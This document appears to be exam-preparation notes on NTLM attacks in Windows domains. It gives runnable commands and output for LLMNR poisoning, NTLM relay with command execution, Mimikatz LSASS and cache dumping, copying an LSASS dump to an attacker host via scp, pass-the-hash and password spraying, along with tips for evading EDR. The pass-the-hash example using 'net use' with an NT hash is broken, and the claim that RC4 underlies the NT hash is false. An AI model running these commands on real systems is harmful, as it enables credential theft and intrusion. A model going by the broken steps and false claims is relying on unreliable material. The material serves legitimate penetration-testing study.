# NTLM Authentication & Credential Attacks

**Track:** Mastering OSCP
**Section:** Active Directory — 020
**Topics:** NTLM Authentication Flow, NTLM Hash Format, LLMNR/NBT-NS Poisoning with Responder, NTLM Relay with ntlmrelayx, LSASS Credential Extraction with Mimikatz, Pass-the-Hash

---

## 1. NTLM Authentication — The Fundamentals

**NTLM (NT LAN Manager)** is a legacy, stateless, challenge-response authentication protocol. It requires no central ticket server, which also makes it inherently more vulnerable to relay attacks and offline cracking than Kerberos.

### 1.1 The NTLM Exchange

**Client → Server:**
1. **NEGOTIATE** — the client sends its username and the NTLM versions it supports.
2. **CHALLENGE** — the server responds with an 8-byte random nonce.
3. **RESPONSE** — the client encrypts that challenge with its NTLM hash and sends the result back.

**Server → Domain Controller:**
1. The server **forwards** the response, challenge, and username to the DC.
2. The DC **verifies** the NTLM hash against the SAM database (local accounts) or `NTDS.DIT` (domain accounts).
3. The DC returns an **authentication success/fail** verdict.

**Domain Controller → Server:**
1. Access is **granted or denied** back to the original server, based on that verdict.

Because the password itself is never transmitted — only a hash-derived response to a challenge — NTLM is more resistant to plaintext sniffing than an unencrypted basic-auth scheme, but it is still very much attackable, as the sections below cover.

### 1.2 NTLM Hash Format

| Component | Value |
|---|---|
| **LM Hash** (deprecated) | `AAD3B435B51404EEAAD3B435B51404EE` |
| **NT Hash** | `8846F7EAEE8FB117AD06BDD830B7586C` |
| **Combined format** | `LM:NT` |
| **Example** | `AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C` |

The **NT hash** is the one that actually matters in modern environments — the LM hash is deprecated and, on current Windows systems, is typically just a fixed placeholder value regardless of the real password.

> **Note:** RC4 is effectively the same cryptographic primitive underlying the NT hash — just referenced by a different name in some Kerberos contexts (e.g. `rc4_hmac_nt`).

---

## 2. Capturing NTLM Hashes on the Network

An attacker positioned on the local network can often capture NTLM authentication attempts in transit, without ever touching the target host directly — by exploiting how Windows resolves hostnames when normal DNS lookups fail.

### 2.1 LLMNR/NBT-NS Poisoning with Responder

**Responder** listens for the fallback name-resolution broadcasts (LLMNR, NBT-NS) that Windows machines send out when a DNS lookup fails, and answers them itself — tricking the requesting machine into authenticating directly to the attacker.

```bash
sudo responder -I eth0 -dwv
```
```
[+] Listening for events...
[LLMNR]  Poisoned answer sent to 10.10.10.15 for name web01
[SMB]    NTLMv2-SSP Client   : 10.10.10.15
[SMB]    NTLMv2-SSP Username : CORP\jdoe
[SMB]    NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:99AABBCCDDEEFF00:0101000000000000...
```

The captured `NTLMv2-SSP Hash` can then be cracked offline (e.g. with Hashcat) or, more powerfully, relayed live — covered next.

### 2.2 NTLM Relay with `ntlmrelayx.py`

Rather than cracking a captured hash, an **NTLM relay attack** forwards the captured authentication attempt straight to another server in real time — authenticating as the victim without ever knowing their password or cracking anything.

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 10.10.10.15, attacking target smb://10.10.10.20
[*] Authenticating against smb://10.10.10.20 as CORP\jdoe SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Executing command: whoami
[*] Command executed successfully: corp\jdoe
```

> This particular relay technique isn't explicitly called out on the OSCP syllabus, but it's foundational knowledge worth having regardless.
>
> NTLM is being phased out in favor of Kerberos, but stays enabled for backward compatibility in most environments. Always check **SMB Signing** status on a target — if it's disabled, NTLM relay becomes possible.

---

## 3. Extracting Credentials from LSASS

### 3.1 Why LSASS Matters

Every Windows machine runs a **local user** account context, and a system process called **LSASS** (Local Security Authority Subsystem Service) that holds passwords, usernames, cryptographic keys, and cached credentials in memory.

Extracting this information matters because a compromised machine may previously have had other users log into it — and LSASS may still be holding onto **their** credentials or domain authentication material (like NTLM hashes), even though they're not the currently logged-in user.

Reaching LSASS requires elevated privileges first — either local Administrator rights or `SeDebugPrivilege`.

### 3.2 Mimikatz

**Mimikatz** is the standard tool for dumping LSASS memory, provided the operator already holds the necessary privileges.

Reference: https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe

```cmd
mimikatz.exe privilege::debug "sekurlsa::logonpasswords"
```
```
Authentication Id : 0 ; 45210 (00000000:0000b09a)
Session           : Interactive from 2
User Name         : jdoe
Domain            : CORP
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : jdoe
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
        wdigest :
         * Username : jdoe
         * Domain   : CORP
         * Password : Summer2023!
        kerberos :
         * Username : jdoe
         * Domain   : CORP.LOCAL
```

### 3.3 Which Hashes Actually Matter

Out of everything Mimikatz can dump, only two hash types are directly usable to gain access to the target without needing to crack them first:

- **AES hash** (`aes256_hmac`)
- **NT hash** (`rc4_hmac_nt`)

Both of these can be used directly in a **Pass-the-Hash** attack — logging in as the user without ever knowing (or cracking) their actual plaintext password.

### 3.4 Pass-the-Hash (PtH)

```cmd
net use \\10.10.10.20\ADMIN$ /user:CORP\jdoe /pass:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```
```
The command completed successfully.
```

### 3.5 Offline LSASS Dump & Analysis

Rather than running Mimikatz directly on the target (higher detection risk), it's common to dump the LSASS process to a file and analyze it offline, elsewhere:

```cmd
# Dump LSASS memory
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

```bash
# Transfer to Linux
scp lsass.dmp attacker@10.10.14.5:/tmp/
```

```cmd
# Analyze with Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```
```
mimikatz(commandline) # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'
mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 45210 (00000000:0000b09a)
Session           : Interactive from 2
User Name         : jdoe
Domain            : CORP
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : jdoe
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
        wdigest :
         * Username : jdoe
         * Domain   : CORP
         * Password : Summer2023!
        kerberos :
         * Username : jdoe
         * Domain   : CORP.LOCAL
```

### 3.6 Extracting Cached Domain Credentials

Windows also caches domain credentials locally (in the registry) to allow logon while disconnected from the domain — a separate target from live LSASS memory.

```cmd
mimikatz.exe privilege::debug "lsadump::cache"
```
```
Domain    : CORP
SysKey    : 8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d
Local SID : S-1-5-21-1234567890-1234567890-1234567890

* Username : jdoe
  Domain   : CORP
  DCC2 Hash: $DCC2$10240#jdoe#8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d
```

> LSASS dumping requires `SeDebugPrivilege` (i.e. Administrator). Modern EDR products commonly flag `sekurlsa::logonpasswords` directly — dumping via `procdump64.exe` and analyzing offline (as in 3.5) is a lower-signature alternative. Cached domain credentials use the **MSCACHE v2** format, which corresponds to **Hashcat mode 2100**.

---

## 4. Password Spraying (Recap in NTLM Context)

Once a valid set of network credentials is in hand, testing them broadly across the environment is a fast way to find where else they're valid:

```bash
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```
```
SMB    10.10.10.10    445    DC01    [+] CORP\jdoe:Password123! (Pwn3d!)
SMB    10.10.10.15    445    FILE01  [+] CORP\jdoe:Password123! (Pwn3d!)
SMB    10.10.10.20    445    WEB01   [-] CORP\asmith:Password123! STATUS_LOGON_FAILURE
```

`--continue-on-success` keeps spraying the remaining username/host combinations even after one succeeds, instead of stopping at the first hit — useful for mapping exactly how far a leaked password has spread across the environment.
